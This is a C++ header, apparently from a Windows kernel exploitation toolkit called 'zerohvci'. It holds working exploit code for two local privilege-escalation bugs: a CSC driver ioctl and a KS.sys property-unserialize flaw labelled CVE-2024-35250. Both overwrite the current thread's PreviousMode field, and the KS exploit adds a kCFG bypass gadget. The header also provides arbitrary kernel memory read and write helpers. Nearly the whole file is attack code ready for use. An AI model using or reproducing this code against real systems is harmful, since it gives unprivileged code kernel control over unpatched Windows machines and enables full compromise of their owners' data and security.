#pragma once
#include "utils.h"
#include "ntdefs.h"
#include <Windows.h>
#include <winternl.h>
#include <Ks.h>
#include <KsMedia.h>
#include <SetupAPI.h>
#include <cstdio>

#pragma comment(lib, "SetupAPI.lib")

namespace zerohvci {

#define CSC_DEV_FCB_XXX_CONTROL_FILE            0x001401a3 // vuln ioctl

const GUID categories[] = { KSCATEGORY_DRM_DESCRAMBLE };

// Helper function to open a KS device by category GUID
// Used for CVE-2024-35250 KS.sys exploit
inline HRESULT KsOpenDefaultDevice(const GUID& Category, DWORD dwAccess, HANDLE* phDevice)
{
    if (!phDevice)
        return E_POINTER;

    *phDevice = NULL;

    // Get device info set for the category
    HDEVINFO hDevInfo = SetupDiGetClassDevsW(
        &Category,
        NULL,
        NULL,
        DIGCF_PRESENT | DIGCF_DEVICEINTERFACE
    );

    if (hDevInfo == INVALID_HANDLE_VALUE)
        return HRESULT_FROM_WIN32(GetLastError());

    SP_DEVICE_INTERFACE_DATA DeviceInterfaceData = { 0 };
    DeviceInterfaceData.cbSize = sizeof(SP_DEVICE_INTERFACE_DATA);

    // Get first device interface
    if (!SetupDiEnumDeviceInterfaces(hDevInfo, NULL, &Category, 0, &DeviceInterfaceData))
    {
        DWORD dwError = GetLastError();
        SetupDiDestroyDeviceInfoList(hDevInfo);
        return HRESULT_FROM_WIN32(dwError);
    }

    // Get required buffer size
    DWORD dwRequiredSize = 0;
    SetupDiGetDeviceInterfaceDetailW(hDevInfo, &DeviceInterfaceData, NULL, 0, &dwRequiredSize, NULL);

    if (dwRequiredSize == 0)
    {
        SetupDiDestroyDeviceInfoList(hDevInfo);
        return E_FAIL;
    }

    // Allocate buffer for device interface detail
    PSP_DEVICE_INTERFACE_DETAIL_DATA_W pDetailData =
        (PSP_DEVICE_INTERFACE_DETAIL_DATA_W)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwRequiredSize);

    if (!pDetailData)
    {
        SetupDiDestroyDeviceInfoList(hDevInfo);
        return E_OUTOFMEMORY;
    }

    pDetailData->cbSize = sizeof(SP_DEVICE_INTERFACE_DETAIL_DATA_W);

    // Get device interface detail
    if (!SetupDiGetDeviceInterfaceDetailW(hDevInfo, &DeviceInterfaceData, pDetailData, dwRequiredSize, NULL, NULL))
    {
        DWORD dwError = GetLastError();
        HeapFree(GetProcessHeap(), 0, pDetailData);
        SetupDiDestroyDeviceInfoList(hDevInfo);
        return HRESULT_FROM_WIN32(dwError);
    }

    // Open the device
    HANDLE hDevice = CreateFileW(
        pDetailData->DevicePath,
        dwAccess,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
        NULL
    );

    HeapFree(GetProcessHeap(), 0, pDetailData);
    SetupDiDestroyDeviceInfoList(hDevInfo);

    if (hDevice == INVALID_HANDLE_VALUE)
        return HRESULT_FROM_WIN32(GetLastError());

    *phDevice = hDevice;
    return S_OK;
}

// Declare data structures related to the exploit
typedef struct _RTL_BITMAP
{
    DWORD SizeOfBitMap;
    PVOID Buffer;
}RTL_BITMAP, * PRTL_BITMAP;

#pragma pack(1)
typedef struct _EXPLOIT_DATA1
{
    PRTL_BITMAP  FakeBitmap;
}EXPLOIT_DATA1;

typedef struct _EXPLOIT_DATA2
{
    char pad[0x20];
    PVOID ptr_ArbitraryFunCall; // kCFG bypass gadget function, for example RtlSetAllBits
} EXPLOIT_DATA2;

// NOTE: GetKThreadPreviousModeOffset() is already defined in ntdefs.h
// which delegates to version::GetKThreadPreviousModeOffset() for dynamic version detection

inline bool ObtainKernelExploitCSC(uintptr_t TargetKThread)
{
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");

    if (!hNtdll)
    {
        printf("[-] Failed to obtain ntdll..\n");
        return false;
    }

    NtReadVirtualMemory = (pNtReadVirtualMemory)GetProcAddress(hNtdll, "NtReadVirtualMemory");
    NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    NtFsControlFile = (PNtFsControlFile)GetProcAddress(hNtdll, "NtFsControlFile");

    if (!NtReadVirtualMemory || !NtWriteVirtualMemory || !NtFsControlFile)
    {
        printf("[-] Failed to obtain required functions..\n");
        return false;
    }

    HANDLE hHandle = NULL;

    UNICODE_STRING  ObjectName = { 0 };
    OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
    RtlInitUnicodeString(&ObjectName, L"\\Device\\Mup\\;Csc\\.\\.");
    InitializeObjectAttributes(&ObjectAttributes, &ObjectName, 0, NULL, NULL);

    IO_STATUS_BLOCK IoStatusBlock = { 0 };
    auto Status = NtCreateFile(&hHandle, SYNCHRONIZE, &ObjectAttributes, &IoStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN_IF, FILE_CREATE_TREE_CONNECTION, NULL, 0);
    if (!NT_SUCCESS(Status))
    {
        printf("[-] NtCreateFile failed with status = %08x\n", Status);
        return false;
    }

    ULONG previousModeOffset = GetKThreadPreviousModeOffset();
    Status = NtFsControlFile(hHandle, NULL, NULL, NULL, &IoStatusBlock, CSC_DEV_FCB_XXX_CONTROL_FILE,
        /*Vuln arg*/ reinterpret_cast<void*>(TargetKThread + previousModeOffset - 0x18), 0, NULL, 0);
    if (!NT_SUCCESS(Status))
    {
        printf("[-] ObtainKernelExploitCSC failed with status: %08x\n", Status);
        return false;
    }

    return true;
}

inline bool ObtainKernelExploitKS(uintptr_t TargetKThread)
{
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] Failed to load ntdll.dll\n");
        return false;
    }

     NtReadVirtualMemory = (pNtReadVirtualMemory)GetProcAddress(hNtdll, "NtReadVirtualMemory");
     NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
     if (!NtReadVirtualMemory || !NtWriteVirtualMemory)
     {
         printf("[-] Failed to obtain required functions..\n");
         return false;
     }

    HANDLE hDrmDevice = NULL;

    HRESULT hr = KsOpenDefaultDevice(categories[0], GENERIC_READ | GENERIC_WRITE, &hDrmDevice);
    if (hr != NOERROR) {
        return false;
    }

    UCHAR InBuffer[sizeof(KSPROPERTY) + sizeof(EXPLOIT_DATA2)] = { 0 };
    UCHAR UnserializePropertySetRequest[sizeof(KSPROPERTY_SERIALHDR) + sizeof(KSPROPERTY_SERIAL) + sizeof(EXPLOIT_DATA1)] = { 0 };

    auto pInBufProperty = reinterpret_cast<KSPROPERTY*>(InBuffer);
    auto pInBufPropertyData = reinterpret_cast<EXPLOIT_DATA2*>(pInBufProperty + 1);

    auto pSerialHdr = reinterpret_cast<KSPROPERTY_SERIALHDR*>(UnserializePropertySetRequest);
    auto pSerial = reinterpret_cast<PKSPROPERTY_SERIAL>(pSerialHdr + 1);
    auto pOutBufPropertyData = reinterpret_cast<EXPLOIT_DATA1*>(pSerial + 1);

    pInBufProperty->Set = KSPROPSETID_DrmAudioStream;
    pInBufProperty->Flags = KSPROPERTY_TYPE_UNSERIALIZESET;
    pInBufProperty->Id = 0x0;
    pSerialHdr->PropertySet = KSPROPSETID_DrmAudioStream;
    pSerialHdr->Count = 1;
    pSerial->PropertyLength = sizeof(EXPLOIT_DATA1);
    pSerial->Id = 0x0;
    pSerial->PropTypeSet.Set = KSPROPSETID_DrmAudioStream;
    pSerial->PropTypeSet.Flags = 0x0;
    pSerial->PropTypeSet.Id = 0x45;

    ULONG previousModeOffset = GetKThreadPreviousModeOffset();
    pOutBufPropertyData->FakeBitmap = reinterpret_cast<PRTL_BITMAP>(AllocateBitmap(sizeof(RTL_BITMAP), reinterpret_cast<void*>(0x10000000)));
    pOutBufPropertyData->FakeBitmap->SizeOfBitMap = 0x20;
    pOutBufPropertyData->FakeBitmap->Buffer = reinterpret_cast<void*>(TargetKThread + previousModeOffset);
    pInBufPropertyData->ptr_ArbitraryFunCall = reinterpret_cast<void*>(LeakGadgetAddress("RtlClearAllBits"));

    // Trigger vulnerability
    BOOL Result = DeviceIoControl(hDrmDevice, IOCTL_KS_PROPERTY, pInBufProperty, sizeof(InBuffer), pSerialHdr, sizeof(UnserializePropertySetRequest), NULL, NULL);

    if (!Result) {
        printf("[-] ObtainKernelExploitKS failed with status: %08x\n", GetLastError());
        return false;
    }

    return true;
}

inline ULONG64 GetEProcessViaPID(ULONG TargetProcessId)
{
    HANDLE hHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, TargetProcessId);
    return GetKernelObject(TargetProcessId, hHandle);
}

inline ULONG64 GetCurrentEProcess()
{
    return GetEProcessViaPID(GetCurrentProcessId());
}

inline ULONG64 GetCurrentKThread()
{
    HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());
    return GetKernelObject(GetCurrentProcessId(), hThread);
}

inline ULONG64 GetKThread(ULONG TargetProcessId, ULONG TargetThreadId)
{
    HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, TargetThreadId);
    return GetKernelObject(TargetProcessId, hThread);
}

inline bool ReadKernelMemory(PVOID Source, PVOID Buffer, SIZE_T Size)
{
    SIZE_T cbNumOfBytesRead = 0;

    // FIX: Use SIZE_T and PSIZE_T to match corrected function signature
    NTSTATUS Status = NtReadVirtualMemory(GetCurrentProcess(), Source, Buffer, Size, &cbNumOfBytesRead);
    if (!NT_SUCCESS(Status))
    {
        return false;
    }

    return true;
}

inline bool WriteKernelMemory(PVOID Destination, PVOID Source, SIZE_T Size)
{
    SIZE_T cbNumOfBytesWrite = 0;

    // Note: After PreviousMode is flipped to KernelMode (0), NtWriteVirtualMemory
    // allows writing to kernel addresses using the current process handle.
    // Destination is the kernel address to write to, Source is the usermode buffer.
    // FIX: Use SIZE_T and PSIZE_T to match corrected function signature
    NTSTATUS Status = NtWriteVirtualMemory(GetCurrentProcess(), Destination, Source, Size, &cbNumOfBytesWrite);

    if (!NT_SUCCESS(Status))
    {
        return false;
    }
    return true;
}

} // namespace zerohvci
